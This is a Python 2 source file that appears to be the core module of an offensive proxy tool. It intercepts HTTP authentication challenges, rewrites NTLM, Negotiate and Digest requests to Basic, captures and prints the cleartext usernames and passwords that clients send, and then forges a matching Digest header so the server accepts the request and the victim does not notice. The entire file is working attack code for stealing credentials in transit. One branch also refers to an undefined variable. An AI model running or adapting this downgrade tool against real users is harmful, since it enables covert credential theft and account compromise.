import config
import hashlib
import time
import os
import re

from base64 import b64decode
from urlparse import urlparse

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

# Respond to the digest challenge after grabbing the clear text username and password.
# Bits and pieces taken from https://github.com/kennethreitz/requests/blob/master/requests/auth.py
def build_digest_header(method, url, username, password, challenge):

	def extract_parts(challenge):

		if challenge.lower().startswith('digest '):
			challenge = challenge[7:]

		parts = {}
		for p in ['realm', 'nonce', 'domain', 'opaque', 'uri', 'algorithm', 'qop']:
			try:
				parts[p] = re.search(p+'="?([^\", ]*)"?', challenge).groups(1)[0]
			except:
				parts[p] = None
		return parts

	parts = extract_parts(challenge)
	hash_utf8 = None

	if parts['algorithm'] is None:
		parts['algorithm'] = 'MD5'
	else:
		parts['algorithm'] = parts['algorithm'].upper()

	# lambdas assume digest modules are imported at the top level
	if parts['algorithm'] == 'MD5' or parts['algorithm'] == 'MD5-SESS':
		def md5_utf8(x):
			if isinstance(x, str):
				x = x.encode('utf-8')
			return hashlib.md5(x).hexdigest()
		hash_utf8 = md5_utf8
	elif parts['algorithm'] == 'SHA':
		def sha_utf8(x):
			if isinstance(x, str):
				x = x.encode('utf-8')
			return hashlib.sha1(x).hexdigest()
		hash_utf8 = sha_utf8

	KD = lambda s, d: hash_utf8("%s:%s" % (s, d))

	if hash_utf8 is None:
		return None

	p_parsed = urlparse(url)
	path = p_parsed.path or "/"
	if p_parsed.query:
		path += '?' + p_parsed.query

	A1 = '%s:%s:%s' % (username, parts['realm'], password)
	A2 = '%s:%s' % (method, path)

	HA1 = hash_utf8(A1)
	HA2 = hash_utf8(A2)

	ncvalue = '00000001'
	s = ncvalue.encode('utf-8')
	s += parts['nonce'].encode('utf-8')
	s += time.ctime().encode('utf-8')
	s += os.urandom(8)

	cnonce = (hashlib.sha1(s).hexdigest()[:16])
	if parts['algorithm'] == 'MD5-SESS':
		HA1 = hash_utf8('%s:%s:%s' % (HA1, parts['nonce'], cparts['nonce']))

	if not parts['qop']:
		respdig = KD(HA1, "%s:%s" % (parts['nonce'], HA2))

	elif parts['qop'] == 'auth' or 'auth' in parts['qop'].split(','):
		noncebit = "%s:%s:%s:%s:%s" % (parts['nonce'], ncvalue, cnonce, 'auth', HA2)
		respdig = KD(HA1, noncebit)
	
	else:
		return None

	base = 'username="%s", realm="%s", nonce="%s", uri="%s", response="%s"' % (username, parts['realm'], parts['nonce'], path, respdig)
	if parts['opaque']:
		base += ', opaque="%s"' % parts['opaque']
	if parts['algorithm']:
		base += ', algorithm="%s"' % parts['algorithm']
	if parts['qop']:
		base += ', qop="auth", nc=%s, cnonce="%s"' % (ncvalue, cnonce)

	return 'Digest %s' % base


# When the client sends request containing basic credentials
# extract the creds and then recalculate the correct auth by
# using these creds, and return rewritten headers to forward
# to server.
def decode_auth(headers, client, method, uri):

	if 'Basic' in headers['Authorization']:
		ip = str(client[0])

		print ""
		decoded = b64decode(headers['Authorization'].split()[1])
		print color("[+] Received Basic credentials from %s: %s" % (ip, decoded), 2)


		# Handling auth completion
		if ip in config.cfg.clients:

			hdr = config.cfg.clients[ip]

			if hdr.startswith('Digest '):

				username, password = decoded.split(':')
				auth = build_digest_header(method, uri, username, password, hdr)

				if auth is not None:
					print color("[+] Forwarding reconstructed Digest auth to server", 3, 1)
					headers['Authorization'] = auth

			if hdr.startswith('NTLM') or hdr.startswith('Negociate'):
				print color("[+] TODO - not implemeted yet: Calculate NTLM auth from clear text creds", 2, 1)

	return headers

# Do the actual header rewrite
def downgrade(client, data, code, type):
	print ""

	ip = str(client[0])

	if config.cfg.clients.has_key(ip) and not config.cfg.args.nonstop:
		print color("[+] Intercepted %d auth request for excluded client %s, ignoring" % (code, ip), 3, 1)
		return data

	print color("[+] Intercepted %d auth request for %s, rewriting to Basic" % (code, ip), 3)

	for m in ['NTLM', 'Negociate', 'Digest']:

		s = "%s-Authenticate: %s" % (type, m)

		# Saving the requested auth for later use
		if s in data:
			hdr = data.split('\r\n\r\n')[0]
			hdr = hdr.split('\r\n')

			for h in hdr:
				if h.startswith(s):
					config.cfg.clients[ip] = h.split(': ', 2)[1]

		data = data.replace(s, "%s-Authenticate: Basic" % type)

	return data


# When intercepting a response from the server asking for authentication
# Rewrite to basic
def handle_server_response(headers, client, data):

	if "WWW-Authenticate: Basic" in data or "Proxy-Authenticate: Basic" in data:
		print ""
		print color("[+] Intercepted auth request for %s, already Basic, not doing anything" % client[0], 3)
		return data

	if data.startswith('HTTP/1.1 401') and 1 in config.cfg.args.levels:
		return downgrade(client, data, 401, 'WWW')

	if data.startswith('HTTP/1.1 407') and 2 in config.cfg.args.levels:
		return downgrade(client, data, 407, 'Proxy')

	if data.startswith('HTTP/1.1 200') and 3 in config.cfg.args.levels:
		pass # TODO

	return data
